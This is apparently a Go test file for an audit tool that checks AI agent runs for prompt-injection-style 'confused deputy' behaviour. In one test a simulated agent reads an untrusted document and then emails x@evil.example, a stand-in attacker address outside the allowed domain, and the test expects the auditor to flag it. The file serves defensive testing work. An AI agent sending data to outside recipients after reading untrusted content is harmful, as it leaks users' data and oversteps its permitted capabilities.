package audit

import (
	"testing"

	"github.com/41vi4p/agentbreak/core/internal/scenario"
	"github.com/41vi4p/agentbreak/core/internal/world"
)

func TestConfusedDeputyAfterUntrustedContent(t *testing.T) {
	sc := &scenario.Scenario{
		ID: "t", SystemPrompt: "x", Tools: []string{"read_document", "send_email"}, UserTask: []string{"u"},
		Documents:    map[string]scenario.Document{"d": {Text: "hi", Untrusted: true}},
		Capabilities: map[string]scenario.Capability{"send_email": {Egress: true, AllowedRecipientDomains: []string{"corp.example"}}},
	}
	w := world.New(sc)
	w.Call("read_document", "1", map[string]any{"doc_id": "d"})
	w.Call("send_email", "2", map[string]any{"to": "x@evil.example", "subject": "s", "body": "b"})
	kinds := map[string]bool{}
	for _, f := range Dynamic(sc, w) {
		kinds[f.Kind] = true
	}
	if !kinds["confused_deputy"] || !kinds["capability_violation"] {
		t.Fatalf("want confused_deputy and capability_violation, got %v", kinds)
	}
}

func TestNoFindingWithoutUntrustedContext(t *testing.T) {
	sc := &scenario.Scenario{
		ID: "t", SystemPrompt: "x", Tools: []string{"send_email"}, UserTask: []string{"u"},
		Capabilities: map[string]scenario.Capability{"send_email": {Egress: true, AllowedRecipientDomains: []string{"corp.example"}}},
	}
	w := world.New(sc)
	w.Call("send_email", "1", map[string]any{"to": "boss@corp.example", "subject": "s", "body": "b"})
	if fs := Dynamic(sc, w); len(fs) != 0 {
		t.Fatalf("legitimate internal email flagged: %v", fs)
	}
}
